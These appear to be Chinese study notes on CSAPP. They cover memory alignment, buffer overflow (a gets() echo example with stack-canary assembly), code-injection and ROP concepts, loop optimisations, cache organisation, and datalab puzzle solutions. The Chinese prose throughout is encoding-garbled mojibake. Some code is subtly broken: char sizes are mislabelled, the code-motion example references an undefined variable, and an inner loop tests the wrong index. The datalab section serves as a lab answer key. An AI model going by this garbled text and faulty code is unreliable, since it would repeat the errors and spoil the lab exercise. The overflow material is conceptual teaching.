**å†…å­˜å¯¹é½**ï¼š

> å†…å­˜å¯¹é½åˆ†ä¸ºä¸‰ç§æ–¹å¼ï¼šæ•°æ®å¯¹é½ï¼Œæ•°æ®ç»“æ„å¡«å……ä»¥åŠç´§ç¼©

<img src="csapp.assets/image-20220902134845808.png" alt="image-20220902134845808" style="zoom:80%;" />

ä¸ºä»€ä¹ˆéœ€è¦æ•°æ®å¯¹é½ï¼š

1. ç°ä»£è®¡ç®—æœºåœ¨æ•°æ®è‡ªç„¶å¯¹é½çš„æ—¶å€™è¯»å†™å†…å­˜æ•ˆç‡æœ€é«˜ã€‚

å¦‚ä½•å¯¹é½ï¼š

1. ä¸»è¦æ•°æ®ç±»å‹ä¸º K å­—èŠ‚ï¼Œé‚£ä¹ˆæ•°æ®å­˜å‚¨åœ°å€å¿…é¡»æ˜¯ K çš„æ•´æ•°å€ã€‚

å…¶ä¸­ä¸»è¦æ•°æ®ç±»å‹çš„å®šä¹‰ä¸ºè¯¥ç»“æ„ä½“ä¸­æœ€å¤§å­—èŠ‚çš„ç±»å‹ã€‚

å¦‚æœå¯¹äºä¸€ä¸ªç»“æ„ä½“ï¼Œå…¶æœ€ç»ˆå¤§å°ä¸æ˜¯ K çš„æ•´æ•°å€ï¼Œç¼–è¯‘å™¨ä¼šåœ¨ç»“æ„ä½“æœ«å°¾å¡«å……å­—èŠ‚æ•°æ¥ä½¿å…¶æˆä¸º K çš„æ•´æ•°å€ã€‚

<img src="csapp.assets/image-20220902142734094.png" alt="image-20220902142734094" style="zoom:67%;" />

éœ€è¦æ³¨æ„ä¸€ç‚¹çš„æ˜¯ï¼Œæœ€ç»ˆå¡«å……çš„å­—èŠ‚æ•°**ä¹Ÿç®—åœ¨**ç»“æ„ä½“ä¹‹å†…ã€‚

ä¸¾ä¾‹ï¼š

```c
#include <stdio.h>

typedef struct {
    char c1;        // 2 + (2) padding
    int i1;         // 4
    char c2;        // 2 + (2) æœ«å°¾å¡«å……
} a;


typedef struct {
    int i1;         // 4
    char c1;        // 2
    char c2;        // 2
} b;


typedef struct {
    double f1;      // 8
    int a1;         // 4
    int a2;         // 4
    char cc1;       // 1 + (7)
} c;

int main() {
    a a1;
    b b1;
    c c1;
    printf("%ld, %ld, %ld\n", sizeof(a1), sizeof(b1), sizeof(c1));
    // 12, 8, 24
}
```

### 5. è¿›é˜¶

ğŸ”µx86-64 Linux å†…å­˜å¸ƒå±€

![image-20220903114716001](csapp.assets/image-20220903114716001.png)

åœ¨ Linux æ ˆæ˜¯æ”¾åœ¨æœ€é¡¶å±‚çš„ï¼Œæ ˆçš„åœ°å€ä»é«˜ä½åˆ°ä½ä½æ¥å¢é•¿çš„ã€‚

ğŸ”µç¼“å†²åŒºæº¢å‡º

```c
typedef struct {
    int a[2];
    double d;
} struct_t;

double fun(int i) {
    volatile struct_t s;
    s.d = 3.14;
    s.a[i] = 1073741824;
    return s.d;
}
```

åœ¨ C / C++ ä¸­å¹¶æ²¡æœ‰å¯¹æ•°ç»„ç´¢å¼•è¿›è¡Œè¾¹ç•Œæ£€æŸ¥ï¼Œå› æ­¤å¾ˆå®¹æ˜“å‡ºç°ç¼“å†²åŒºæº¢å‡ºçš„æƒ…å†µï¼Œå¯¼è‡´å‡ºç°é‡å¤§ç³»ç»Ÿå®‰å…¨æ¼æ´ã€‚

å¤§éƒ¨åˆ†ç¼“å†²åŒºæº¢å‡ºæ˜¯è¯•å›¾å­˜å‚¨ä»ä¿¡æ¯ä¸­è¯»å–çš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ä¸çŸ¥é“å­—ç¬¦ä¸²æœ‰å¤šå¤§ã€‚å¾ˆå¤šåº“å‡½æ•°ä¹Ÿä¸ä¼šæ£€æŸ¥è¾¹ç•Œï¼Œæ¯”å¦‚ C ä¸­çš„ `gets()` å‡½æ•°ã€‚

```c
char *gets(char *dest) {
    int c = getchar();
    char *p = dest;
    while(c != EOF && c != '\n') {
        *p++ = c;
        c = getchar();
    }
    *p = '\0';
    return dest;
}
```

ç¼“å†²åŒºæº¢å‡ºçš„å…³é”®å°±æ˜¯ç¼–å†™çš„ä»£ç æ— æ³•ä¿è¯æ•°æ®çš„è¾¹ç•Œæ˜¯ 100% æœ‰é™çš„ï¼Œä»è€Œå¯¼è‡´ä¼šæ¶æ„ç¨‹åºä¼šæ— é™è¯»å–ä¿¡æ¯ã€‚

æ¡ˆä¾‹ï¼š

```c
void echo() {
    char buf[4];
    gets(buf);
    puts(buf);
}
```

å¯¹åº”çš„æ±‡ç¼–ä»£ç ï¼š

```
4005d6:       48 83 ec 18				sub    $0x18,%rsp
// ===== Canary start ====
4005da:       64 48 8b 04 25 28 00		mov    %fs:0x28,%rax
4005e1:       00 00
4005e3:       48 89 44 24 08			mov    %rax,0x8(%rsp)
// ===== Canary Over ====
4005e8:       31 c0						xor    %eax,%eax
4005ea:       48 89 e7					mov    %rsp,%rdi
4005ed:       e8 ce fe ff ff			callq  4004c0 <gets@plt>
4005f2:       48 89 e7					mov    %rsp,%rdi
4005f5:       e8 96 fe ff ff			callq  400490 <puts@plt>
// ===== Canary start ====
4005fa:       48 8b 44 24 08			mov    0x8(%rsp),%rax
4005ff:       64 48 33 04 25 28 00		xor    %fs:0x28,%rax
// ===== Canary Over ====
400606:       00 00
400608:       74 05						je     40060f <echo+0x39>
// ===== Canary Function
40060a:       e8 91 fe ff ff			callq  4004a0 <__stack_chk_fail@plt>
40060f:       48 83 c4 18				add    $0x18,%rsp
400613:       c3						retq
```

è¿è¡Œç»“æœï¼š

```
$ ./b
12345678
12345678
$ ./b
123456789
123456789
*** stack smashing detected ***: ./b terminated
Aborted
```

ç”±æ±‡ç¼–ä»£ç å¯ä»¥çŸ¥é“ï¼Œè™½ç„¶ä»£ç ä¸­åªç»™åˆ†é…äº† 4 å­—èŠ‚çš„ç©ºé—´ï¼Œä½†æ˜¯åœ¨æ±‡ç¼–ä»£ç ä¸­åˆ†é…äº† 0x18 å­—èŠ‚çš„ç©ºé—´ï¼Œå› æ­¤ç¨å¾®è¶…å‡ºä¸€ç‚¹èŒƒå›´ç¨‹åºä¹Ÿå¯ä»¥æ­£å¸¸è¿è¡Œã€‚åœ¨æ²¡æœ‰ç³»ç»Ÿä¿æŠ¤çš„æƒ…å†µä¸‹å¯ä»¥å†™æ»¡ 0x18 ä¸ªå­—èŠ‚ï¼Œè¿™é‡Œæ˜¯å› ä¸ºstack canary ä¿æŠ¤çš„åŸå› åªå†™äº† 10 å­—èŠ‚å¯¼è‡´æå‰å¼‚å¸¸ã€‚

ğŸ”µä»£ç æ³¨å…¥æ”»å‡»

![image-20220903132121766](csapp.assets/image-20220903132121766.png)

åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåˆ†é…çš„ `char` æ•°ç»„ä¿å­˜åœ¨æ ˆå¸§ä¸­ï¼Œå¹¶ä¸” `gets` ä¼šåˆ†é… 20 ä¸ªé¢å¤–çš„å­—èŠ‚ï¼›å†ç´§æ¥ç€å°±æ˜¯ä¸Šä¸€ä¸ªå‡½æ•°çš„è¿”å›åœ°å€ã€‚ä»£ç æ³¨å…¥çš„æ€æƒ³å°±æ˜¯ä¿®æ”¹ä¸Šä¸ªå‡½æ•°çš„è¿”å›åœ°å€ï¼Œè·³åˆ°æ¶æ„ä»£ç çš„åœ°å€ã€‚

![image-20220903132831160](csapp.assets/image-20220903132831160.png)

æ€ä¹ˆé˜²æŠ¤ï¼Ÿ

* ä½¿ç”¨å®‰å…¨å‡½æ•°æ¯”å¦‚ fgets() æ›¿ä»£ gets() å‡½æ•°ã€‚

* ç³»ç»Ÿçº§åˆ«çš„ä¿æŠ¤ï¼šå½“ç¨‹åºè¿è¡Œæ—¶éšæœºåˆ†é…æ ˆ/å †çš„åœ°å€

* ä»ç¡¬ä»¶å±‚é¢æ ‡è®°æ ˆä¸Šçš„æ•°æ®ä¸å¯è¢«æ‰§è¡Œ

* stack canaryï¼Œåœ¨ canary éƒ¨åˆ†å†™å…¥ç‰¹å®šå­—ç¬¦ï¼Œç­‰æ‰§è¡Œå®Œæ¯•åæ£€æŸ¥ canary å­—æ®µå­—ç¬¦æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸ä¸€è‡´å°±è¡¨ç¤ºç¼“å†²åŒºæº¢å‡ºï¼Œä»è€Œæå‰æŠ¥é”™ã€‚

  ![image-20220903140349256](csapp.assets/image-20220903140349256.png)

ğŸ”µROP æ”»å‡»

> ROP: Return-Oriented Programming

æ ˆéšæœºåŒ–ã€ä¸å¯æ‰§è¡Œæ ˆå’Œ canaries ä¿æŠ¤æªæ–½ä¼šå¯¼è‡´ç¼“å†²åŒºæº¢å‡ºæ”»å‡»å¤±è´¥ï¼Œæ ˆéšæœºåŒ–ä¼šå¾ˆéš¾é¢„æµ‹ç¼“å†²åŒºçš„ä½ç½®ï¼Œä¸å¯ç”¨æ‰§è¡Œæ ˆå¾ˆéš¾å–æ’å…¥äºŒè¿›åˆ¶ä»£ç ã€‚

ä½¿ç”¨ ROP æ”»å‡»å¯ä»¥è§£å†³å‰ä¸¤ä¸ªé—®é¢˜ã€‚

![image-20220908103826691](csapp.assets/image-20220908103826691.png)

å¯é€‰ç­–ç•¥ï¼š

* ä½¿ç”¨ç°å­˜ä»£ç ï¼Œæ¯”å¦‚åº“ä»£ç (stdlib)
* è™½ç„¶ä½¿ç”¨æ ˆå †éšæœºåŒ–ï¼Œä½†æ˜¯å…¨å±€å˜é‡å’Œä»£ç çš„åœ°å€å¹¶æœªæ”¹å˜ã€‚å¯ä»¥å°†ä¸€ç³»åˆ—ä»£ç æ‹¼æ¥æˆå­—ç¬¦ä¸²ï¼Œç»„åˆåœ¨ä¸€èµ·

æ–¹æ³•ï¼š

* æ‰¾åˆ°ä¸€äº› gadgets (å¯ä»¥ç†è§£ä¸ºå°ç‰‡æ®µçš„ä»£ç )ï¼Œå…¶ä¸­æœ€åä¸€ä¸ªå­—èŠ‚ä¸º 0xc3 (ret)

  ![image-20220907131921265](csapp.assets/image-20220907131921265.png)

  å¯¹äºè¿™æ®µä»£ç å¯ä»¥ä½¿ç”¨åä¸¤å¥ä»£ç æ¥è·å–å¯„å­˜å™¨ rdi å’Œ rdx ä¸­å’Œçš„å€¼ã€‚

  ä¹Ÿå¯ä»¥ä½¿ç”¨éƒ¨åˆ†ä»£ç ï¼š

  ![image-20220907133756979](csapp.assets/image-20220907133756979.png)

## å››. ç¨‹åºä¼˜åŒ–

### 1. å¸¸è§ä¼˜åŒ–æŠ€å·§

* Code Motion ä»£ç ç§»åŠ¨

  ```c
  void func(int m, int n) {
      for(int j = 0; j < n; j++) {
          a[m * n + j] = b[j];
      }
  }
  
  void func(int m, int n) {
      // é˜²æ­¢é‡å¤è®¡ç®—æµªè´¹èµ„æº
      int k = m * n;
      for(int j = 0; j < n; j++) {
          a[l + j] = b[j];
      }
  }
  ```

* Share Common Subexpressions å…±äº«å¸¸ç”¨å­è¡¨è¾¾å¼

  ```c
  up		=	arr[(x-1)*m + j];
  down	=	arr[(x+1)*m + j];
  
  // ä¼˜åŒ–
  
  int k = x * m + j;
  up 	= arr[k - m];
  down = arr[k + m]
  ```

* Procedure Call Optimization (strlen problem) å‡½æ•°è°ƒç”¨ä¼˜åŒ–

  è¿™é‡Œå‡ºç°çš„é—®é¢˜å°±æ˜¯æ¯æ¬¡å¾ªç¯éƒ½éœ€è¦è°ƒç”¨ `strlen` å‡½æ•°ï¼Œåœ¨å‡½æ•°è¿”å›å€¼å§‹ç»ˆä¸å˜çš„æƒ…å†µä¸‹ï¼Œé‡å¤è°ƒç”¨æ—¶ååˆ†è€—è´¹èµ„æºã€‚

  ```c
  void lower(char *s) {
      size_t i;
      for (i = 0; i < strlen(s); i++)
          if (s[i] >= 'A' && s[i] <= 'Z')
              s[i] -= ('A' - 'a');
  }
  
  // ä¼˜åŒ– for å¾ªç¯è°ƒç”¨å¤šæ¬¡ strlen
  
  void lower(char *s) {
      size_t i;
      size_t len = strlen(s);
      for (i = 0; i < len; i++)
          if (s[i] >= 'A' && s[i] <= 'Z')
              s[i] -= ('A' - 'a');
  }
  ```

  

* Memory aliasing

  aliasing å°±æ˜¯å½“ç¨‹åºçš„ä¸åŒéƒ¨åˆ†å¼•ç”¨å†…å­˜ä¸­ç›¸åŒä½ç½®æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªå†…å­˜æ•°æ®ç»“æ„è¦†ç›–å¦ä¸€ä¸ªæ•°æ®ç»“æ„

  è¯´äººè¯å°±æ˜¯å¯¹ä¸€ç‰‡å†…å­˜åŒºåŸŸæ—¢è¿›è¡ŒæŸ¥è¯¢åˆè¿›è¡Œä¿®æ”¹ã€‚

  ```c
  void sum_rows1(double *a, double *b, long n) {
      for(int i = 0; i < n; i ++) {
          b[i] = 0;
          int ni = n * i;
          for(int j = 0; i < n; j ++) {
              b[i] += a[ni + j];
          }
      }
  }
  ```

  ![image-20220906222653246](csapp.assets/image-20220906222653246.png)

  å›¾ä¸­ B æŒ‡å‘ A + 3 çš„ä½ç½®ï¼Œä¹‹å B çš„å€¼æ—¶æ ¹æ® A ä¸­æ¯ä¸€è¡Œä¹‹åå†³å®šçš„ï¼›B ä¸­æ•°å€¼è¿›è¡Œä¿®æ”¹ç›¸å½“äºä¹Ÿå¯¹ A è¿›è¡Œäº†ä¿®æ”¹ï¼Œä»è€Œå½±å“äº† B ä¸­çš„ç»“æœã€‚

* ç¡¬ä»¶å±‚é¢çš„æ”¹è¿›ï¼š

  æ¯”å¦‚ Loop Unrollingï¼ŒBranch Prediction Through Loop

## äº”. å†…å­˜ç»“æ„

### 1. Basic

ç¡¬ç›˜æ•°æ®è®¿é—®åˆ†ä¸ºä»¥ä¸‹é˜¶æ®µï¼š

<img src="csapp.assets/image-20220909125138182.png" alt="image-20220909125138182" style="zoom:67%;" />

å½“åœ¨ä¸Šä¸ªç£é“æ•°æ®ä¼ è¾“å®Œæ¯•åï¼Œæ¢é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªä¿¡æ¯æ‰€å­˜å‚¨çš„ç£é“ä½ç½®ï¼Œç­‰å¾…åŒºåŸŸæ—‹è½¬åˆ°æ¢é’ˆä½ç½®ï¼Œæœ€ç»ˆè¯»å–æ•°æ®ã€‚å…¶ä¸­æ•°æ®ä¼ è¾“çš„ç›¸æ¯”äºå…¶ä»–é˜¶æ®µå¯ä»¥å¿½ç•¥ä¸è®°ã€‚

<img src="csapp.assets/image-20220911214534762.png" alt="image-20220911214534762" style="zoom:80%;" />

ğŸ”µLocality

Principle of Locality (å±€éƒ¨æ€§åŸç†): Programs tend to use data and instructions with addresses near or equal to those they used recently.

å±€éƒ¨æ€§åˆ†ä¸ºä¸¤ç§ï¼š

* æ—¶é—´å±€éƒ¨æ€§ï¼šæœ€è¿‘å¼•ç”¨é¡¹å¾ˆå¯èƒ½åœ¨ä¸ä»…çš„å°†æ¥ç»§ç»­å¼•ç”¨ã€‚ 
* ç©ºé—´å±€éƒ¨æ€§ï¼šæœ€è¿‘è¢«è®¿é—®è¿‡å•å…ƒåœ°å€é™„è¿‘å¾ˆæœ‰å¯èƒ½ä¹Ÿä¼šè¢«è®¿é—®ã€‚

å¾€å¾€è¶Šå¥½ä½¿ç”¨å±€éƒ¨æ€§åŸç†å¯¹åº”çš„ç¨‹åºæ€§èƒ½ä¹Ÿä¼šè¶Šå¥½ã€‚æ¯”å¦‚åœ¨éå†äºŒç»´æ•°ç»„çš„æ—¶å€™ï¼Œå…ˆä»è¡Œéå†è¿˜æ˜¯å…ˆä»åˆ—å¼€å§‹éå†ï¼Œå¦‚æœå…ˆä»åˆ—å¼€å§‹è¿›è¡Œéå†ï¼Œå¯¹äºç©ºé—´å±€éƒ¨æ€§æ¥è¯´å°±å¾ˆä¸å‹å¥½ï¼Œå› æ­¤ä¸¤è€…éå†æ–¹å¼æœ€ç»ˆå¯¼è‡´çš„æ€§èƒ½å·®å¼‚ä¹Ÿä¼šå¾ˆå¤§ã€‚

<img src="csapp.assets/image-20220911223053715.png" alt="image-20220911223053715" style="zoom:80%;" />

ç¼“å­˜æ¦‚å¿µçš„å‡ºç°å°±æ˜¯åŸºäºå±€éƒ¨æ€§åŸç†ã€‚å¦‚æœå¯„å­˜å™¨æƒ³è¦è·å–å†…å­˜ä¸­çš„æ•°æ®ä¿¡æ¯ï¼Œé¦–å…ˆå¯„å­˜å™¨ä»ç¼“å­˜ä¸­æ‰¾å¯¹åº”çš„æ•°æ®ï¼Œå¦‚æœæ‰¾åˆ°(hit)åˆ™å¯ä»¥ç›´æ¥è¿”å›ç»™å¯„å­˜å™¨ï¼Œå¦‚æœæœªå‘½ä¸­(Miss)åˆ™éœ€è¦å°†ä¸»å­˜ä¸­çš„æ•°æ®ä¼ è¾“åˆ°ç¼“å­˜ä¸­ï¼Œå†ä¼ ç»™å¯„å­˜å™¨ã€‚

ç¼“å­˜æœªå‘½ä¸­çš„ç±»å‹ï¼š

* Cold(Compulsory) miss: å†· miss çš„åŸå› æ˜¯å› ä¸ºç¼“å­˜ä¸ºç©ºï¼Œæ— æ³•å‘½ä¸­æ˜¯å¿…ç„¶çš„
* Conflict missï¼šå†²çªæœªå‘½ä¸­ï¼Œè¿™å’Œç¼“å­˜çš„å®ç°æ–¹å¼æœ‰å…³ï¼ˆä¸‹ä¸€èŠ‚ï¼‰
* Capacity miss: è¿™å½’ç»“äºç¼“å­˜çš„å¤§å°æ˜¯å›ºå®šçš„ï¼Œè€Œéœ€è¦è®¿é—®çš„ç¼“å­˜æ•°æ®èŒƒå›´è¾ƒå¤§ã€‚

![image-20220911224322667](csapp.assets/image-20220911224322667.png)

### 2. Cache é«˜é€Ÿç¼“å­˜

<img src="csapp.assets/image-20220912123856638.png" alt="image-20220912123856638" style="zoom: 67%;" />

è¿™ä¸ªæ˜¯ç¼“å­˜çš„é€šç”¨ç»„ç»‡ç»“æ„ï¼Œé€šå¸¸ç”± Sï¼ŒEï¼ŒB æ¥è¿›è¡Œè¡¨ç¤ºï¼š

å…¶ä¸­ S è¡¨ç¤ºæœ‰ $2^s$ ä¸ª setï¼ŒE è¡¨ç¤ºæ¯ä¸ª set ä¸­å«æœ‰ $2^e$ ä¸ª lineï¼ŒB è¡¨ç¤º Blockï¼Œæ¯ä¸ª line ä¸­æœ‰ $2^b$ ä¸ªå­—èŠ‚çš„æ•°æ®ã€‚

æ€»å…±å ç”¨çš„å­—èŠ‚æ•°ä¸ºï¼š$C=S\times E\times B$

åœ¨æ¯ä¸ª block ä¸­ï¼š

* v(valid) è¡¨ç¤ºè¿™ä¸ªå—æ˜¯å¦æœ‰å®é™…æ„ä¹‰
* tag ç”¨äºå¸®åŠ©æœç´¢ block
* æ•°æ®éƒ¨åˆ†

ğŸ”µç¼“å­˜è¯»

CPU å‘é€åœ°å€åˆ°ç¼“å­˜ï¼Œè¦æ±‚ç¼“å­˜è¿”å›åœ°å€å¤„çš„æ•°æ®ï¼Œè¿™ä¸ªåœ°å€ç”±å¤šä¸ªéƒ¨åˆ†ç»„æˆï¼š

![image-20220912140246772](csapp.assets/image-20220912140246772.png)

* t è¡¨ç¤º tag ç”¨äºå¸®åŠ©æœç´¢
* s è¡¨ç¤º set çš„ç´¢å¼•ä½ç½®
* b ç¡®å®š block ä¸­è¯¥ç›®æ ‡æ•°æ®å¼€å§‹çš„åç§»é‡

é¦–å…ˆé€šè¿‡ set index æ¥ç¡®å®šæ•°æ®å¯¹åº”ç¼“å­˜ä¸­çš„ setï¼Œç„¶åä¼šæ£€æŸ¥tä½ tag ç¡®å®š line ä¸­çš„ tag æ˜¯å¦ä¸ä¹‹åŒ¹é…ï¼Œå¹¶ä¸”æ£€æŸ¥ line ä¸­çš„æœ‰æ•ˆä½æ˜¯å¦å¼€å¯ã€‚å¦‚æœä»¥ä¸Šæ¡ä»¶éƒ½æ»¡è¶³ï¼Œåˆ™è¡¨ç¤ºç¼“å­˜å‘½ä¸­ã€‚

å‚è€ƒï¼š[ä¸»å­˜åˆ°Cacheç›´æ¥æ˜ å°„ã€å…¨ç›¸è”æ˜ å°„å’Œç»„ç›¸è”æ˜ å°„](https://blog.csdn.net/dongyanxia1000/article/details/53392315)

* ç›´æ¥æ˜ å°„ï¼š

  ![image-20220912144230857](csapp.assets/image-20220912144230857.png)

  ç›´æ¥æ˜ å°„å¾ˆæœ‰å¯èƒ½ä¼šå¯¼è‡´æŸå¤„ Cache æ·˜æ±°æ¢å‡ºé¢‘ç¹ï¼Œè€ŒæŸå¤„ Cache ç©ºç€ä¹Ÿä¸ä¼šä½¿ç”¨ã€‚Cache çš„å­˜å‚¨ç©ºé—´å¾—ä¸åˆ°å……åˆ†åˆ©ç”¨ã€‚

  ç‰¹å®šå°±æ˜¯ç®€å•ï¼Œæˆæœ¬ä½ï¼Œåœ°å€å˜æ¢å¿«é€Ÿä¸”ä¸æ¶‰åŠæ›¿æ¢ç®—æ³•çš„é—®é¢˜ã€‚

  ç”±äºç¼“å­˜ä¹‹é—´çš„ä½å…³è”æ€§ï¼Œå› æ­¤éœ€è¦å¢åŠ  line çš„æ•°é‡ã€‚

* å¤šè·¯ç»„ç›¸è”æ˜ å°„

  ![image-20220912151230285](csapp.assets/image-20220912151230285.png)

  å¯¹äº 2 è·¯ç»„ç›¸è”æ˜ å°„ï¼Œæ‰¾åˆ°å¯¹åº”çš„ set ä¹‹åï¼Œå¯¹æ¯”æ¯ä¸ª line çš„ tagï¼Œå¦‚æœæœ‰æ•ˆä½å’Œ tag éƒ½ä¸€è‡´çš„è¯å°±è¡¨ç¤ºå‘½ä¸­ã€‚

  ![image-20220912152116796](csapp.assets/image-20220912152116796.png)

ğŸ”µç¼“å­˜å†™

å¯¹äºå¾ˆå¤šå±‚çº§ç»“æ„æ¯”å¦‚ L1ã€L2ã€L3ã€ä¸»å­˜ä»¥åŠç¡¬ç›˜ç­‰æ•°æ®ï¼Œå¦‚æœæƒ³è¦å°†æ•°æ®å†™å›è¿™äº›ç¡¬ä»¶è¯¥å¦‚ä½•æ“ä½œã€‚

Write-hit æœ‰ä¸¤ç§ç­–ç•¥ï¼š

1. write-throughï¼šç›´å†™ç­–ç•¥ï¼Œç›´æ¥å°†æ•°æ®å†™å›å†…å­˜ï¼Œä½†æ˜¯è®¿é—®æ¶ˆè€—ååˆ†æ˜‚è´µã€‚
2. write-backï¼šå›å†™ç­–ç•¥ï¼Œä¸ä¼šç›´æ¥å†™å›å†…å­˜ï¼Œç›´åˆ°å¯¹åº”ç¼“å­˜åŒºåŸŸè¢«æ›¿æ¢å°±å†™å›ã€‚éœ€è¦æ·»åŠ é¢å¤–çš„ä½æ ‡è®°æ˜¯å¦å†™å…¥å†…å­˜

Write-miss ä¹Ÿæœ‰ä¸¤ç§ç­–ç•¥ï¼šï¼ˆå³æƒ³è¦å†™å…¥çš„æ•°æ®ä¸åœ¨ç¼“å­˜ä¸­ï¼‰

1. write-allocate: å³å°†å†…å­˜ä¸­çš„æ•°æ®å†™å…¥ç¼“å­˜ï¼Œåœ¨ç¼“å­˜ä¸­è¿›è¡Œæ›´æ–°ï¼Œå¦‚æœä¹‹åæœ‰æ›´å¤šçš„å†™æ“ä½œï¼Œä¼šæ˜æ˜¾æœ‰æ€§èƒ½æç¤ºã€‚
2. no-write-allocate: ç›´æ¥å†™å…¥å†…å­˜

> Javaä¸­çš„ volatile å…³é”®å­—å°±æ˜¯è§£å†³ç¼“å­˜å’Œå†…å­˜ä¸­ä¸ä¸€è‡´çš„æƒ…å†µã€‚

ç°ä»£è®¡ç®—æœºç¼“å­˜ç»“æ„ï¼š

<img src="csapp.assets/image-20220912160509160.png" alt="image-20220912160509160" style="zoom:80%;" />

d-cache è¡¨ç¤ºæ•°æ®ç¼“å­˜ï¼Œi-cache è¡¨ç¤ºæŒ‡ä»¤ç¼“å­˜ã€‚

ğŸ”µç¼“å­˜æ€§èƒ½è¯„ä¼°æŒ‡æ ‡

* Miss rate
* Hit time
* Miss Penaltyï¼Œå³ç¼“å­˜å‘½ä¸­å¤±è´¥æ‰€éœ€è¦é¢å¤–è€—è´¹çš„æ—¶é—´

ç¼“å­˜å‘½ä¸­è¦æ¯”ç¼“å­˜æœªå‘½ä¸­çš„é€Ÿåº¦è¦å— 100 å€ã€‚

99% çš„å‘½ä¸­ç‡è¦æ¯” 97% æ€§èƒ½é«˜ä¸¤å€ã€‚

ğŸ”µç©ºé—´å±€éƒ¨æ€§ä¼˜åŒ–å…¸å‹æ¡ˆä¾‹

æ ¹æ®å†…å­˜å±±ï¼ˆcsappå°é¢ï¼‰çš„å†…å®¹ï¼Œæœ€å…¸å‹çš„ä¼˜åŒ–æ–¹æ¡ˆå°±æ˜¯çŸ©é˜µä¹˜æ³•ï¼š

å¦‚æœé‡‡ç”¨ ijk çš„æ–¹å¼è¿›è¡Œç›¸ä¹˜ï¼š

![image-20220912163339030](csapp.assets/image-20220912163339030.png)

å¯¹äºçŸ©é˜µ B æ¥è¯´å°±å¾ˆä¸ç¬¦åˆç©ºé—´å±€éƒ¨æ€§çš„è¦æ±‚ï¼Œç¼“å­˜å‘½ä¸­ç‡å‡ ä¹ä¸º 0.

è€Œå¯¹äº kij çš„æ–¹å¼æ¥è¯´ï¼š

![image-20220912163450569](csapp.assets/image-20220912163450569.png)

å¯¹ç©ºé—´å±€éƒ¨æ€§çš„ä¼˜åŒ–ã€‚

ğŸ”µæ—¶é—´å±€éƒ¨æ€§ä¼˜åŒ–

é€šå¸¸ä½¿ç”¨ blocking çš„æŠ€æœ¯

## Appendix

### 1. datalab-wp

1. bitXorï¼Œå¼‚æˆ–è¿ç®—

   ```c
   /*
    * bitXor - x^y using only ~ and &
    *   Example: bitXor(4, 5) = 1
    *   Legal ops: ~ &
    *   Max ops: 14
    *   Rating: 1
    */
   int bitXor(int x, int y) {
     return ~(~(~x&y)&~(~y&x));
   }
   ```

   æ ¹æ®æ•°å­—é€»è¾‘ç”µè·¯çš„çŸ¥è¯†å¯ä»¥çŸ¥é“ï¼šå¼‚æˆ–å¯ä»¥è¡¨ç¤ºä¸º $A\oplus B=\overline AB+A\overline B$ ï¼Œæˆ–è¿ç®—åªä½¿ç”¨ä¸å’Œéç¬¦å·å¯ä»¥è¡¨ç¤ºä¸º $A+B=\overline{\overline A\ \overline B}$ ã€‚

2. tminï¼Œè¿”å› int ç±»å‹è¡¥ç æœ€å°å€¼

   ```c
   /*
    * tmin - return minimum two's complement integer
    *   Legal ops: ! ~ & ^ | + << >>
    *   Max ops: 4
    *   Rating: 1
    */
   int tmin(void) {
     return 1 << 31;
   }
   ```

   å³ 0x80000000

3. isTmaxï¼Œåˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦æ˜¯ TMAX

   ```c
   //2
   /*
    * isTmax - returns 1 if x is the maximum, two's complement number,
    *     and 0 otherwise
    *   Legal ops: ! ~ & ^ | +
    *   Max ops: 10
    *   Rating: 1
    */
   int isTmax(int x) {
     return (~!(x+1))&!(~((x+1)^x));
   }
   ```

   åˆ¤æ–­å…¶æ˜¯å¦ç­‰äº 0x7fffffffã€‚åœ¨ int èŒƒå›´å†…åªæœ‰ä¸¤ä¸ªæ•°å­—æ»¡è¶³ `(x+1)^x=0xffffffff`ï¼Œåˆ†åˆ«æ˜¯ 0x7fffffff å’Œ 0xffffffffã€‚å› æ­¤åªéœ€è¦æ¥ä¸‹æ¥åŒºåˆ†è¿™ä¸¤ä¸ªæ•°å­—å³å¯ã€‚

4. allOddBitsï¼Œåˆ¤æ–­æ‰€æœ‰å¥‡æ•°ä½æ˜¯å¦å…¨ä¸º 1

   ```c
   int allOddBits(int x) {
       int a = 0xaa+(0xaa<<8)+(0xaa<<16)+(0xaa<<24);
       return !((x&a)^a);
   }
   ```

   å’Œ 0xaaaaaaaa å¯¹æ¯”å³å¯ã€‚

5. negateï¼Œå–è´Ÿæ•°

   ```c
   /*
    * negate - return -x
    *   Example: negate(1) = -1.
    *   Legal ops: ! ~ & ^ | + << >>
    *   Max ops: 5
    *   Rating: 2
    */
   int negate(int x) {
     return ~x+1;
   }
   ```

   è´Ÿæ•°è¡¥ç =åç +1

6. åˆ¤æ–­æ˜¯å¦æ˜¯ ascii å­—ç¬¦

   ```c
   /*
    * isAsciiDigit - return 1 if 0x30 <= x <= 0x39 (ASCII codes for characters '0' to '9')
    *   Example: isAsciiDigit(0x35) = 1.
    *            isAsciiDigit(0x3a) = 0.
    *            isAsciiDigit(0x05) = 0.
    *   Legal ops: ! ~ & ^ | + << >>
    *   Max ops: 15
    *   Rating: 3
    */
   int isAsciiDigit(int x) {
     return !(x>>4^3) & ( ((x>>3&1)^1) | ( (x>>3&1) & !(x >> 1 & 3)) );
   }
   ```

   é¦–å…ˆåˆ¤æ–­æ˜¯å¦æ˜¯ 0x3*ï¼Œæœ«å°¾ 0 ~ 9 çš„äºŒè¿›åˆ¶è¡¨ç¤ºå¯ä»¥è¡¨ç¤ºä¸º 0\*\*\* å’Œ 1000ï¼Œ1001ï¼Œåˆ†åˆ«å¤„ç†è¿™ä¸‰ç§æƒ…å†µå³å¯ã€‚

7. conditionalï¼Œä½¿ç”¨ä½è¿ç®—å®ç°ä¸‰å…ƒè¿ç®—ç¬¦

   ```c
   /*
    * conditional - same as x ? y : z
    *   Example: conditional(2,4,5) = 4
    *   Legal ops: ! ~ & ^ | + << >>
    *   Max ops: 16
    *   Rating: 3
    */
   int conditional(int x, int y, int z) {
     return (z&(!!x+~0))+(y&(!x+~0));
   }
   ```

   å¯¹äºä»»æ„ä¸€ä¸ªæ•°å­—æœ‰ä»¥ä¸‹å¯¹åº”è¡¨ï¼š

   |   x   |  !x  | !!x  |     !!x+~0     |
